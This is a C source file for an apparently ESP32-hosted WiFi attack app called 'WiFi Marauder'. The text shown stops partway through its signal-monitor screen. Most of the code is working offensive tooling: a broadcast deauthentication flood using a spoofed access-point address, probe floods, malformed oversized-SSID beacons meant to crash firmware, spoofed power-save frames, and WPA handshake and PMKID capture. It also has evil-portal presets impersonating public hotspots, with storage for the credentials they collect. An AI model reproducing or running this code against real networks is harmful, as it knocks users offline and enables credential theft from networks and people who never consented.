// WiFi Marauder — Palanu WASM App
//
// Native Palanu WiFi audit tool. Runs directly on the ESP32 radio —
// no external board, no UART round-trip.
//
// Menu structure:
//   Main Menu
//     Scan APs  → AP List → AP Detail → Deauth / Probe Flood / Signal Monitor
//                                      → badmsg Attack / Sleep Attack
//     Sniff     → Beacons / Probes / Deauths / PMKID / Raw Monitor
//     Attacks   → Beacon Spam / Beacon by AP List / Rickroll / Karma /
//                 Evil Portal / Set MAC
//     Scripts   → run scripts.txt from SD card
//     About
//
// This is a radio-takeover app: at launch it calls wifi_acquire() to claim the
// WiFi radio for its whole lifetime (one permission prompt), so features switch
// with no disconnect/reconnect churn. Network tools that need a normal STA
// connection (ARP/port scan) live in a separate app, not here.
//
// Build:
//   cd examples/wifi-marauder
//   clang --target=wasm32-unknown-unknown -nostdlib -O2 \
//         -I../../packages/app-sdk/include \
//         -Wl,--no-entry -Wl,--export=main \
//         -Wl,--allow-undefined -Wl,--strip-all \
//         -o dist/wifi-marauder.wasm main.c

#include "nema_api.h"

// ── Constants ──────────────────────────────────────────────────────────────────

// Bump this by hand on every change so you can verify on-device (About screen)
// that the build you flashed/cp'd is actually the one running.
#define APP_VERSION       "3.3.3"

#define MAX_APS           20
#define MAX_SSID_LEN      33
#define MAX_BSSID_LEN     18
#define SCAN_BUF_SZ       2048
#define FRAME_BUF_SZ      2500
#define EVENT_BUF_SZ      256
#define MAX_SNIFF_APS     16
#define MAX_SNIFF_PROBES  16
#define MAX_SNIFF_DEAUTHS 16
#define MAX_EAPOL_CAPS    8
#define MAX_KARMA_HITS    16
#define MAX_EP_CREDS      8
#define MAX_ARP_HOSTS     20
#define MAX_OPEN_PORTS    12
#define MAX_PCAP_FRAMES   20
#define PCAP_FRAME_MAX    512

// Default beacon spam SSIDs
#define DEFAULT_SPAM_COUNT 10
static const char kDefaultSpamSsids[] =
    "Free WiFi\0"
    "FBI Surveillance Van\0"
    "Not Your WiFi\0"
    "Pretty Fly for a WiFi\0"
    "Searching...\0"
    "The Internet\0"
    "Bill Wi the Science Fi\0"
    "Wu-Tang LAN\0"
    "LAN Solo\0"
    "DropItLikeItsHotspot\0";

// Rickroll SSIDs
#define RICKROLL_COUNT 8
static const char kRickrollSsids[] =
    "Never Gonna Give You Up\0"
    "Never Gonna Let You Down\0"
    "Never Gonna Run Around\0"
    "And Desert You\0"
    "Never Gonna Make You Cry\0"
    "Never Gonna Say Goodbye\0"
    "Never Gonna Tell a Lie\0"
    "And Hurt You\0";

// Common ports for port scan
static const int kCommonPorts[] = {
    21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 8080
};
#define N_COMMON_PORTS 12

// Evil portal SSID presets
static const char* kEpSsids[] = {
    "Free WiFi",
    "Hotel WiFi",
    "Airport Network",
    "Starbucks WiFi",
};
#define N_EP_SSIDS 4

// MAC address presets for spoofing
static const char* kFakeMacs[] = {
    "DE:AD:BE:EF:00:01",
    "DE:AD:BE:EF:CA:FE",
    "12:34:56:78:9A:BC",
    "AA:BB:CC:DD:EE:FF",
};
#define N_FAKE_MACS 4

// ── Types ──────────────────────────────────────────────────────────────────────

typedef struct {
    char bssid[MAX_BSSID_LEN];
    char ssid[MAX_SSID_LEN];
    int  channel;
    int  rssi;
    char auth[16];
} Ap;

typedef struct {
    char bssid[MAX_BSSID_LEN];
    char ssid[MAX_SSID_LEN];
    int  channel;
    int  count;
} SniffAp;

typedef struct {
    char ssid[MAX_SSID_LEN];
    char src[MAX_BSSID_LEN];
    int  count;
} SniffProbe;

typedef struct {
    char bssid[MAX_BSSID_LEN];
    char sta[MAX_BSSID_LEN];
    int  reason;
    int  count;
} SniffDeauth;

typedef struct {
    char          bssid[MAX_BSSID_LEN];
    char          sta[MAX_BSSID_LEN];
    int           msg;
    unsigned char pmkid[16];
    int           has_pmkid;
} EapolCap;

typedef struct {
    int total;
    int beacon;
    int probe;
    int deauth;
    int data;
    int other;
} FrameStats;

typedef struct {
    char ssid[MAX_SSID_LEN];
    char sta[MAX_BSSID_LEN];
} KarmaHit;

typedef enum {
    SCR_MAIN = 0,
    SCR_SCANNING,
    SCR_AP_LIST,
    SCR_AP_DETAIL,
    SCR_DEAUTHING,
    SCR_MONITORING,
    SCR_BEACON_SPAM,
    SCR_ABOUT,
    SCR_SNIFF_MENU,
    SCR_SNIFF_BEACONS,
    SCR_SNIFF_PROBES,
    SCR_SNIFF_DEAUTHS,
    SCR_SNIFF_PMKID,
    SCR_PROBE_FLOOD,
    SCR_RICKROLLING,
    SCR_SIGNAL_MON,
    SCR_ATTACKS_MENU,
    SCR_MAC_SPOOF,
    SCR_KARMA,
    SCR_EVIL_PORTAL,
    SCR_SCRIPTS,
} Screen;

// ── Globals ────────────────────────────────────────────────────────────────────

static Ap      g_aps[MAX_APS];
static int     g_ap_count = 0;
static int     g_selected = 0;
static Screen  g_screen   = SCR_MAIN;
static int     g_mon_ch   = 1;
static int     g_sniff_ch = 1;

static SniffAp     g_sniff_aps[MAX_SNIFF_APS];       static int g_sniff_ap_count  = 0;
static SniffProbe  g_sniff_prb[MAX_SNIFF_PROBES];    static int g_sniff_prb_count = 0;
static SniffDeauth g_sniff_dau[MAX_SNIFF_DEAUTHS];   static int g_sniff_dau_count = 0;
static EapolCap    g_eapol[MAX_EAPOL_CAPS];           static int g_eapol_count     = 0;

static KarmaHit    g_karma_hits[MAX_KARMA_HITS];      static int g_karma_count     = 0;
static char        g_ep_creds[MAX_EP_CREDS][128];     static int g_ep_cred_count   = 0;
static char        g_arp_hosts[MAX_ARP_HOSTS][20];    static int g_arp_count       = 0;
static int         g_open_ports[MAX_OPEN_PORTS];      static int g_open_count      = 0;
static char        g_port_target[20];

static unsigned char g_pcap_frames[MAX_PCAP_FRAMES][PCAP_FRAME_MAX];
static int           g_pcap_lens[MAX_PCAP_FRAMES];
static int           g_pcap_count = 0;
static int           g_pcap_save  = 0;

static int g_beacon_ap_list_mode = 0;

// ── String utilities ───────────────────────────────────────────────────────────

static int str_eq(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return *a == *b;
}

static int str_len(const char* s) { int n = 0; while (s[n]) n++; return n; }

static void str_copy(char* dst, const char* src, int max) {
    int i = 0;
    while (src[i] && i < max - 1) { dst[i] = src[i]; i++; }
    dst[i] = '\0';
}

static void str_append(char* dst, int cap, int* used, const char* src) {
    while (*src && *used < cap - 1) dst[(*used)++] = *src++;
    dst[*used] = '\0';
}

static const char* parse_int(const char* s, int* out) {
    int neg = 0, v = 0;
    if (*s == '-') { neg = 1; s++; }
    while (*s >= '0' && *s <= '9') v = v * 10 + (*s++ - '0');
    *out = neg ? -v : v;
    return s;
}

// Minimal strstr without libc
static const char* find_str(const char* hay, const char* needle) {
    for (; *hay; hay++) {
        const char* h = hay, *n = needle;
        while (*h && *n && *h == *n) { h++; n++; }
        if (!*n) return hay;
    }
    return 0;
}

// ── MAC / 802.11 frame utilities ──────────────────────────────────────────────

static void hex_mac(const unsigned char* b, char* out) {
    static const char h[] = "0123456789ABCDEF";
    for (int i = 0; i < 6; i++) {
        out[i*3+0] = h[(b[i] >> 4) & 0xF];
        out[i*3+1] = h[b[i] & 0xF];
        out[i*3+2] = (i < 5) ? ':' : '\0';
    }
}

// Parse "AA:BB:CC:DD:EE:FF" → 6 bytes. Returns 1 on success.
static int parse_hex_mac(const char* s, unsigned char out[6]) {
    for (int i = 0; i < 6; i++) {
        unsigned int b = 0;
        for (int j = 0; j < 2; j++) {
            b <<= 4;
            char c = s[i*3 + j];
            if (c >= '0' && c <= '9') b |= (unsigned int)(c - '0');
            else if (c >= 'A' && c <= 'F') b |= (unsigned int)(c - 'A' + 10);
            else if (c >= 'a' && c <= 'f') b |= (unsigned int)(c - 'a' + 10);
            else return 0;
        }
        out[i] = (unsigned char)b;
    }
    return 1;
}

static void frame_bssid(const unsigned char* f, int n, char* out) {
    out[0] = '\0'; if (n < 22) return; hex_mac(f + 16, out);
}
static void frame_sa(const unsigned char* f, int n, char* out) {
    out[0] = '\0'; if (n < 16) return; hex_mac(f + 10, out);
}
static void frame_da(const unsigned char* f, int n, char* out) {
    out[0] = '\0'; if (n < 10) return; hex_mac(f + 4, out);
}

static void extract_ssid_ie(const unsigned char* f, int n, int ie_start, char* ssid_out) {
    ssid_out[0] = '\0';
    int ie = ie_start;
    while (ie + 2 <= n && ie < ie_start + 128) {
        unsigned char tag = f[ie], len = f[ie + 1];
        if (tag == 0x00) {
            if (len == 0) { str_copy(ssid_out, "(hidden)", 33); return; }
            if (ie + 2 + len > n || len > 32) return;
            for (int i = 0; i < (int)len; i++) ssid_out[i] = (char)f[ie + 2 + i];
            ssid_out[len] = '\0';
            return;
        }
        if (len == 0) break;
        ie += 2 + len;
    }
}

static int beacon_channel_ie(const unsigned char* f, int n) {
    if (n < 38) return 0;
    int ie = 36;
    while (ie + 2 <= n && ie < 36 + 256) {
        unsigned char tag = f[ie], len = f[ie + 1];
        if (tag == 0x03 && len == 1 && ie + 3 <= n) return f[ie + 2];
        if (len == 0) break;
        ie += 2 + len;
    }
    return 0;
}

static int mgmt_reason(const unsigned char* f, int n) {
    if (n < 26) return 0;
    return (int)f[24] | ((int)f[25] << 8);
}

static int find_eapol_offset(const unsigned char* f, int n) {
    for (int i = 24; i < n - 1 && i < 60; i++) {
        if (f[i] == 0x88 && f[i+1] == 0x8E) return i + 2;
    }
    return -1;
}

static int eapol_key_msg(const unsigned char* eapol, int n) {
    if (n < 7) return 0;
    if (eapol[1] != 3) return 0;
    if (eapol[4] != 0x02) return 0;
    unsigned char hi = eapol[5], lo = eapol[6];
    int pairwise = (lo >> 3) & 1;
    int install  = (lo >> 6) & 1;
    int ack      = (lo >> 7) & 1;
    int mic      = (hi >> 0) & 1;
    if (!pairwise) return 0;
    if (ack && !mic) return 1;
    if (!ack && mic && !install) {
        if (n >= 99) {
            unsigned int kdlen = ((unsigned int)eapol[97] << 8) | eapol[98];
            if (kdlen == 0) return 4;
        }
        return 2;
    }
    if (ack && mic && install) return 3;
    return 0;
}

static int try_extract_pmkid(const unsigned char* eapol, int n, unsigned char pmkid_out[16]) {
    if (n < 99) return 0;
    unsigned int kdlen = ((unsigned int)eapol[97] << 8) | eapol[98];
    if (kdlen < 22 || (int)(99 + kdlen) > n) return 0;
    const unsigned char* kd = eapol + 99;
    for (int i = 0; i + 22 <= (int)kdlen; i++) {
        if (kd[i]   == 0xDD && kd[i+1] == 0x14 &&
            kd[i+2] == 0x00 && kd[i+3] == 0x0F &&
            kd[i+4] == 0xAC && kd[i+5] == 0x04) {
            nema_memcpy(pmkid_out, kd + i + 6, 16);
            return 1;
        }
    }
    return 0;
}

// ── PCAP capture ──────────────────────────────────────────────────────────────

static void pcap_reset(void) {
    g_pcap_count = 0;
}

static void pcap_add(const unsigned char* data, int n) {
    if (!g_pcap_save || g_pcap_count >= MAX_PCAP_FRAMES) return;
    int cap = n < PCAP_FRAME_MAX ? n : PCAP_FRAME_MAX;
    nema_memcpy(g_pcap_frames[g_pcap_count], data, cap);
    g_pcap_lens[g_pcap_count] = cap;
    g_pcap_count++;
}

static void write_le32(char* buf, int* pos, unsigned int v) {
    buf[(*pos)++] = (char)(v & 0xFF);
    buf[(*pos)++] = (char)((v >> 8) & 0xFF);
    buf[(*pos)++] = (char)((v >> 16) & 0xFF);
    buf[(*pos)++] = (char)((v >> 24) & 0xFF);
}

static void pcap_save(const char* filename) {
    if (g_pcap_count == 0) return;
    static char pcap_buf[24 + MAX_PCAP_FRAMES * (PCAP_FRAME_MAX + 16)];
    int pos = 0;
    // Global PCAP header
    write_le32(pcap_buf, &pos, 0xA1B2C3D4u);  // magic
    write_le32(pcap_buf, &pos, 0x00040002u);  // version 2.4 LE
    write_le32(pcap_buf, &pos, 0);            // thiszone
    write_le32(pcap_buf, &pos, 0);            // sigfigs
    write_le32(pcap_buf, &pos, 65535);        // snaplen
    write_le32(pcap_buf, &pos, 105);          // link type: IEEE 802.11
    // Per-packet records
    for (int i = 0; i < g_pcap_count; i++) {
        int n = g_pcap_lens[i];
        write_le32(pcap_buf, &pos, (unsigned int)i);  // ts_sec = frame index
        write_le32(pcap_buf, &pos, 0);                // ts_usec
        write_le32(pcap_buf, &pos, (unsigned int)n);  // incl_len
        write_le32(pcap_buf, &pos, (unsigned int)n);  // orig_len
        nema_memcpy(pcap_buf + pos, g_pcap_frames[i], n);
        pos += n;
        if (pos + PCAP_FRAME_MAX + 16 > (int)sizeof(pcap_buf)) break;
    }
    nema_storage_fs_write_file(filename, pcap_buf, pos);
}

// ── Sniff dedup helpers ────────────────────────────────────────────────────────

static void sniff_ap_seen(const char* bssid, const char* ssid, int ch) {
    for (int i = 0; i < g_sniff_ap_count; i++) {
        if (str_eq(g_sniff_aps[i].bssid, bssid)) { g_sniff_aps[i].count++; return; }
    }
    if (g_sniff_ap_count >= MAX_SNIFF_APS) return;
    int i = g_sniff_ap_count++;
    str_copy(g_sniff_aps[i].bssid, bssid, MAX_BSSID_LEN);
    str_copy(g_sniff_aps[i].ssid,  ssid,  MAX_SSID_LEN);
    g_sniff_aps[i].channel = ch; g_sniff_aps[i].count = 1;
}

static void sniff_probe_seen(const char* ssid, const char* src) {
    for (int i = 0; i < g_sniff_prb_count; i++) {
        if (str_eq(g_sniff_prb[i].ssid, ssid) && str_eq(g_sniff_prb[i].src, src))
            { g_sniff_prb[i].count++; return; }
    }
    if (g_sniff_prb_count >= MAX_SNIFF_PROBES) return;
    int i = g_sniff_prb_count++;
    str_copy(g_sniff_prb[i].ssid, ssid, MAX_SSID_LEN);
    str_copy(g_sniff_prb[i].src,  src,  MAX_BSSID_LEN);
    g_sniff_prb[i].count = 1;
}

static void sniff_deauth_seen(const char* bssid, const char* sta, int reason) {
    for (int i = 0; i < g_sniff_dau_count; i++) {
        if (str_eq(g_sniff_dau[i].bssid, bssid) && str_eq(g_sniff_dau[i].sta, sta))
            { g_sniff_dau[i].count++; return; }
    }
    if (g_sniff_dau_count >= MAX_SNIFF_DEAUTHS) return;
    int i = g_sniff_dau_count++;
    str_copy(g_sniff_dau[i].bssid, bssid, MAX_BSSID_LEN);
    str_copy(g_sniff_dau[i].sta,   sta,   MAX_BSSID_LEN);
    g_sniff_dau[i].reason = reason; g_sniff_dau[i].count = 1;
}

static void eapol_seen(const char* bssid, const char* sta, int msg,
                        const unsigned char* pmkid, int has_pmkid) {
    for (int i = 0; i < g_eapol_count; i++) {
        if (str_eq(g_eapol[i].bssid, bssid) && str_eq(g_eapol[i].sta, sta)) {
            if (msg > g_eapol[i].msg) g_eapol[i].msg = msg;
            if (has_pmkid && !g_eapol[i].has_pmkid)
                { nema_memcpy(g_eapol[i].pmkid, pmkid, 16); g_eapol[i].has_pmkid = 1; }
            return;
        }
    }
    if (g_eapol_count >= MAX_EAPOL_CAPS) return;
    int i = g_eapol_count++;
    str_copy(g_eapol[i].bssid, bssid, MAX_BSSID_LEN);
    str_copy(g_eapol[i].sta,   sta,   MAX_BSSID_LEN);
    g_eapol[i].msg = msg; g_eapol[i].has_pmkid = has_pmkid;
    if (has_pmkid) nema_memcpy(g_eapol[i].pmkid, pmkid, 16);
}

// ── Scan result parser ─────────────────────────────────────────────────────────

static int parse_scan_results(const char* buf, int len) {
    int count = 0;
    const char* p = buf;
    const char* end = buf + len;
    while (p < end && count < MAX_APS) {
        Ap* ap = &g_aps[count];
        int i = 0;
        while (p < end && *p != '|' && i < MAX_BSSID_LEN - 1) ap->bssid[i++] = *p++;
        ap->bssid[i] = '\0'; if (p < end) p++;
        i = 0;
        while (p < end && *p != '|' && i < MAX_SSID_LEN - 1) ap->ssid[i++] = *p++;
        ap->ssid[i] = '\0'; if (p < end) p++;
        p = parse_int(p, &ap->channel); if (p < end && *p == '|') p++;
        p = parse_int(p, &ap->rssi);    if (p < end && *p == '|') p++;
        i = 0;
        while (p < end && *p != '\n' && i < 15) ap->auth[i++] = *p++;
        ap->auth[i] = '\0';
        if (p < end && *p == '\n') p++;
        if (ap->bssid[0]) count++;
    }
    return count;
}

static int find_rssi_for_bssid(const char* buf, int len, const char* target) {
    const char* p = buf;
    const char* end = buf + len;
    while (p < end) {
        char bssid[MAX_BSSID_LEN] = {};
        int i = 0;
        while (p < end && *p != '|' && i < MAX_BSSID_LEN - 1) bssid[i++] = *p++;
        bssid[i] = '\0'; if (p < end) p++;
        while (p < end && *p != '|') p++; if (p < end) p++;
        while (p < end && *p != '|') p++; if (p < end) p++;
        int rssi = 0; p = parse_int(p, &rssi);
        while (p < end && *p != '\n') p++; if (p < end) p++;
        if (str_eq(bssid, target)) return rssi;
    }
    return -127;
}

// ── 802.11 frame type classifier ──────────────────────────────────────────────

static void classify_frame(const unsigned char* f, int n, FrameStats* s) {
    if (n < 2) { s->other++; return; }
    int type    = (f[0] >> 2) & 0x3;
    int subtype = (f[0] >> 4) & 0xF;
    s->total++;
    if (type == 0) {
        if (subtype == 8)                      s->beacon++;
        else if (subtype == 4 || subtype == 5) s->probe++;
        else if (subtype == 12)                s->deauth++;
        else                                   s->other++;
    } else if (type == 2) {
        s->data++;
    } else {
        s->other++;
    }
}

// ── UI helpers ─────────────────────────────────────────────────────────────────

static void ap_label(const Ap* ap, char* buf, int cap) {
    int used = 0;
    str_append(buf, cap, &used, ap->ssid[0] ? ap->ssid : "(hidden)");
    str_append(buf, cap, &used, "  CH");
    char tmp[8]; char* tp = tmp + 7; *tp = '\0';
    int ch = ap->channel;
    if (ch == 0) { *--tp = '0'; } else { while (ch) { *--tp = '0' + ch % 10; ch /= 10; } }
    str_append(buf, cap, &used, tp);
    str_append(buf, cap, &used, " ");
    int rs = ap->rssi;
    if (rs < 0) { str_append(buf, cap, &used, "-"); rs = -rs; }
    tp = tmp + 7; *tp = '\0';
    if (rs == 0) { *--tp = '0'; } else { while (rs) { *--tp = '0' + rs % 10; rs /= 10; } }
    str_append(buf, cap, &used, tp);
    str_append(buf, cap, &used, "dBm");
}

static const char* itoa_s(int n) {
    static char buf[16];
    char* tp = buf + 15; *tp = '\0';
    int neg = (n < 0); if (neg) n = -n;
    if (n == 0) { *--tp = '0'; } else { while (n) { *--tp = '0' + n % 10; n /= 10; } }
    if (neg) *--tp = '-';
    return tp;
}

static void rssi_bar(int rssi, char* out, int cap) {
    int bars = (rssi + 100) * 10 / 70;
    if (bars < 0) bars = 0; if (bars > 10) bars = 10;
    int used = 0; out[0] = '\0';
    str_append(out, cap, &used, "[");
    for (int i = 0; i < 10; i++) str_append(out, cap, &used, i < bars ? "#" : ".");
    str_append(out, cap, &used, bars >= 8 ? "] Exc" :
                                bars >= 6 ? "] Good" :
                                bars >= 4 ? "] Fair" :
                                bars >= 2 ? "] Weak" : "] None");
}

static int sniff_handle_ch(int ev, int* open_flag) {
    if (ev == 1 && g_sniff_ch < 13) {
        g_sniff_ch++;
        if (*open_flag) { wifi_monitor_close(); *open_flag = (wifi_monitor_open(g_sniff_ch) == 0); }
        return 1;
    }
    if (ev == 2 && g_sniff_ch > 1) {
        g_sniff_ch--;
        if (*open_flag) { wifi_monitor_close(); *open_flag = (wifi_monitor_open(g_sniff_ch) == 0); }
        return 1;
    }
    return 0;
}

// ── Inject helpers (WASM-side frame construction) ──────────────────────────────

// badmsg: send beacon with oversized SSID IE (255 bytes) to crash/confuse firmware
static void inject_badmsg(const Ap* ap) {
    static unsigned char frame[300];
    // Beacon header template
    static const unsigned char kHdr[36] = {
        0x80, 0x00,                          // FC: beacon
        0xFF, 0xFF,                          // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
        0xDE, 0xAD, 0xBE, 0xEF, 0xBA, 0xD0,  // SA (fake BSSID)
        0xDE, 0xAD, 0xBE, 0xEF, 0xBA, 0xD0,  // BSSID
        0x00, 0x00,                          // Seq ctrl
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // timestamp
        0x64, 0x00, 0x01, 0x04,              // interval + caps
    };
    nema_memcpy(frame, kHdr, 36);
    // Patch fake BSSID using AP's BSSID last byte
    unsigned char bssid[6]; parse_hex_mac(ap->bssid, bssid);
    nema_memcpy(frame + 10, bssid, 6);
    nema_memcpy(frame + 16, bssid, 6);
    int pos = 36;
    frame[pos++] = 0x00;   // SSID IE tag
    frame[pos++] = 0xFF;   // oversized length = 255
    for (int i = 0; i < 255; i++) frame[pos++] = (unsigned char)(i & 0xFF);
    for (int t = 0; t < 10; t++) {
        wifi_inject(ap->channel, frame, pos);
        delay(50);
    }
    wifi_inject_release();  // release lease; clears "Radio in use" banner
}

// sleep: null data frame with PM=1 from spoofed AP → all STAs stop receiving
static void inject_sleep(const Ap* ap) {
    unsigned char frame[24] = {
        0x48, 0x12,                          // FC: null data, PM=1, FromDS=1
        0x3A, 0x01,                          // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: spoofed BSSID
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,                          // Seq ctrl
    };
    unsigned char bssid[6]; parse_hex_mac(ap->bssid, bssid);
    nema_memcpy(frame + 10, bssid, 6);
    nema_memcpy(frame + 16, bssid, 6);
    for (int t = 0; t < 20; t++) {
        wifi_inject(ap->channel, frame, 24);
        delay(50);
    }
    wifi_inject_release();  // release lease; clears "Radio in use" banner
}

// ── Main Menu ─────────────────────────────────────────────────────────────────
#define MMENU_SCAN     1
#define MMENU_SNIFF    2
#define MMENU_ATTACKS  3
#define MMENU_SCRIPTS  5
#define MMENU_ABOUT    6

static int screen_main(void) {
    ui_begin();
    ui_title("WiFi Marauder");
    ui_button("Scan APs",    MMENU_SCAN);
    ui_button("Sniff",       MMENU_SNIFF);
    ui_button("Attacks",     MMENU_ATTACKS);
    ui_button("Scripts",     MMENU_SCRIPTS);
    ui_button("About",       MMENU_ABOUT);
    ui_end();
    return ui_wait_event();
}

// ── Scanning ──────────────────────────────────────────────────────────────────

static int screen_scanning(void) {
    ui_begin();
    ui_title("Scanning...");
    ui_text("Searching for APs");
    ui_text("Please wait...");
    ui_end();

    static char scan_buf[SCAN_BUF_SZ];
    int n = wifi_scan(scan_buf, sizeof(scan_buf));
    g_ap_count = (n > 0) ? parse_scan_results(scan_buf, n) : 0;
    g_selected = 0;
    g_screen = SCR_AP_LIST;
    return 0;
}

// ── AP List ───────────────────────────────────────────────────────────────────

static int screen_ap_list(void) {
    char label[64];
    ui_begin();
    ui_title("Scan Results");
    if (g_ap_count == 0) {
        ui_text("No APs found");
        ui_text("Try scanning again");
        ui_button("< Back", 99);
        ui_end();
        int ev = ui_wait_event();
        if (ev == EV_BACK || ev == 99) g_screen = SCR_MAIN;
        return ev;
    }
    char hdr[32] = "Found ";
    int used = 6;
    str_append(hdr, sizeof(hdr), &used, itoa_s(g_ap_count));
    str_append(hdr, sizeof(hdr), &used, " APs:");
    ui_text(hdr);
    for (int i = 0; i < g_ap_count; i++) {
        ap_label(&g_aps[i], label, sizeof(label));
        ui_button(label, i + 1);
    }
    ui_button("< Back", 99);
    ui_end();

    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == 99) {
        g_screen = SCR_MAIN;
    } else if (ev >= 1 && ev <= g_ap_count) {
        g_selected = ev - 1;
        g_screen   = SCR_AP_DETAIL;
    }
    return ev;
}

// ── AP Detail ─────────────────────────────────────────────────────────────────
#define BTN_DEAUTH  1
#define BTN_PROBE   2
#define BTN_SIGNAL  3
#define BTN_BADMSG  4
#define BTN_SLEEP   5
#define BTN_BACK_D  6

static int screen_ap_detail(void) {
    const Ap* ap = &g_aps[g_selected];
    ui_begin();
    ui_title("Target AP");
    ui_text(ap->ssid[0] ? ap->ssid : "(hidden)");
    ui_text(ap->bssid);
    {
        char line[40] = "CH: ";
        int used = 4;
        str_append(line, sizeof(line), &used, itoa_s(ap->channel));
        str_append(line, sizeof(line), &used, "   RSSI: ");
        str_append(line, sizeof(line), &used, itoa_s(ap->rssi));
        str_append(line, sizeof(line), &used, "dBm");
        ui_text(line);
    }
    {
        char line[24] = "Auth: ";
        int used = 6;
        str_append(line, sizeof(line), &used, ap->auth);
        ui_text(line);
    }
    ui_button("Deauth Flood",   BTN_DEAUTH);
    ui_button("Probe Flood",    BTN_PROBE);
    ui_button("Signal Monitor", BTN_SIGNAL);
    ui_button("badmsg Attack",  BTN_BADMSG);
    ui_button("Sleep Attack",   BTN_SLEEP);
    ui_button("< Back",         BTN_BACK_D);
    ui_end();

    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == BTN_BACK_D) g_screen = SCR_AP_LIST;
    else if (ev == BTN_DEAUTH)             g_screen = SCR_DEAUTHING;
    else if (ev == BTN_PROBE)              g_screen = SCR_PROBE_FLOOD;
    else if (ev == BTN_SIGNAL)             g_screen = SCR_SIGNAL_MON;
    else if (ev == BTN_BADMSG) {
        inject_badmsg(ap);
        ui_begin(); ui_title("badmsg Sent");
        ui_text("Malformed beacons sent");
        ui_text("(x10 on target channel)");
        ui_button("OK", 1); ui_end(); ui_wait_event();
        g_screen = SCR_AP_DETAIL;
    } else if (ev == BTN_SLEEP) {
        inject_sleep(ap);
        ui_begin(); ui_title("Sleep Sent");
        ui_text("Null PM frames sent");
        ui_text("(x20 — AP should buffer)");
        ui_button("OK", 1); ui_end(); ui_wait_event();
        g_screen = SCR_AP_DETAIL;
    }
    return ev;
}

// ── Deauth Flood ──────────────────────────────────────────────────────────────

static void screen_deauthing(void) {
    const Ap* ap = &g_aps[g_selected];
    unsigned char bssid[6];
    int have = parse_hex_mac(ap->bssid, bssid);

    // 802.11 deauthentication frame — built HERE in the app. The kernel only
    // provides the generic wifi_inject() primitive; it has no concept of "deauth".
    unsigned char frame[26] = {
        0xC0, 0x00,                          // FC: deauth (type 0, subtype 12)
        0x00, 0x00,                          // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast (deauth all clients)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: spoofed AP BSSID
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,                          // Seq ctrl
        0x07, 0x00,                          // Reason 7: class-3 frame from nonassoc STA
    };
    nema_memcpy(frame + 10, bssid, 6);
    nema_memcpy(frame + 16, bssid, 6);

    int packets = 0;
    while (1) {
        if (have) { wifi_inject(ap->channel, frame, sizeof(frame)); packets++; }

        ui_begin();
        ui_title("Deauthing...");
        if (!have) {
            ui_text("Bad BSSID");
        } else {
            char line[40] = "Target: ";
            int used = 8;
            str_append(line, sizeof(line), &used, ap->ssid[0] ? ap->ssid : ap->bssid);
            ui_text(line);
            char cnt[24] = "Deauths: ";
            used = 9;
            str_append(cnt, sizeof(cnt), &used, itoa_s(packets));
            ui_text(cnt);
        }
        ui_button("Stop", 1);
        ui_end();

        int key = ui_poll_event();
        if (key == EV_BACK || key == 1) break;
        delay(100);   // ~10 Hz; the app paces its own loop, no kernel thread
    }
    // No stop call: the radio is held for the whole session (wifi_acquire), and
    // we simply stopped injecting. Nothing app-specific lingers in the kernel.
    g_screen = SCR_AP_DETAIL;
}

// ── Probe Flood ───────────────────────────────────────────────────────────────

static void screen_probe_flood(void) {
    const Ap* ap = &g_aps[g_selected];
    int ch = ap->channel > 0 ? ap->channel : 1;
    const char* ssid = ap->ssid;            // "" → wildcard probe
    int ssid_len = 0; while (ssid[ssid_len] && ssid_len < 32) ssid_len++;
    static unsigned char probe_seq = 0;
    int probes = 0;

    while (1) {
        // 802.11 probe-request frame, built in-app: 24-byte header + SSID IE +
        // Supported Rates IE. Kernel only provides wifi_inject().
        unsigned char frame[100] = {
            0x40, 0x00, 0x00, 0x00,              // FC: probe req
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00,  // SA: rotated per burst
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID: wildcard
            0x00, 0x00,                          // Seq ctrl
        };
        frame[15] = probe_seq++;
        int pos = 24;
        frame[pos++] = 0x00; frame[pos++] = (unsigned char)ssid_len;   // SSID IE
        for (int i = 0; i < ssid_len; i++) frame[pos++] = (unsigned char)ssid[i];
        static const unsigned char rates[10] =
            {0x01,0x08,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};        // Rates IE
        for (int i = 0; i < 10; i++) frame[pos++] = rates[i];
        wifi_inject(ch, frame, pos);
        probes++;

        ui_begin();
        {
            char hdr[24] = "Probe Flood  CH";
            int used = 15;
            str_append(hdr, sizeof(hdr), &used, itoa_s(ch));
            ui_title(hdr);
        }
        {
            char line[40] = "SSID: ";
            int used = 6;
            str_append(line, sizeof(line), &used, ap->ssid[0] ? ap->ssid : "(wildcard)");
            ui_text(line);
            char cnt[32] = "Probes sent: ";
            used = 13;
            str_append(cnt, sizeof(cnt), &used, itoa_s(probes));
            ui_text(cnt);
        }
        ui_row_begin();
        ui_button("CH+", 1);
        ui_button("CH-", 2);
        ui_row_end();
        ui_button("Stop", 3);
        ui_end();

        int key = ui_poll_event();
        if (key == EV_BACK || key == 3) break;
        if (key == 1 && ch < 13) ch++;          // next inject just uses new ch
        else if (key == 2 && ch > 1) ch--;
        delay(50);   // ~20 Hz
    }
    g_screen = SCR_AP_DETAIL;
}

// ── Signal Monitor ─────────────────────────────────────────────────────────────

static void screen_signal_mon(void) {
    const Ap* ap = &g_aps[g_selected];
    int rssi_min  =  0;
    int rssi_max  = -127;
    int samples   =  0;
    int current   = -127;
    static char scan_buf[SCAN_BUF_SZ];
    char bar[24];

    while (1) {
        ui_begin();
        {
            char hdr[48] = "Signal: ";
            int used = 8;
